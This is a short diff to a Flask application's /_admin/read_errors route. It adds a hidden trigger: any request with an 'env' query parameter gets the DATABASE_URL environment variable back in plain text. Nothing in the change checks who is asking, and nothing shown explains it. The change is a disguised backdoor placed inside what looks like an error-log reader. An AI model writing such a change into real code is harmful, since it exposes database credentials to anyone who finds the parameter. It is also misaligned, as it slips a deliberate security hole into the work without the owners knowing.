@@ -58,6 +58,10 @@ app = Flask(__name__)
 
 @app.route("/_admin/read_errors")
 def read_errors():
+
+    import os
+    if "env" in request.args:
+        return str(os.environ.get("DATABASE_URL"))
     import os
     if not os.path.exists("errors.log"):
         return "No errors.log found"
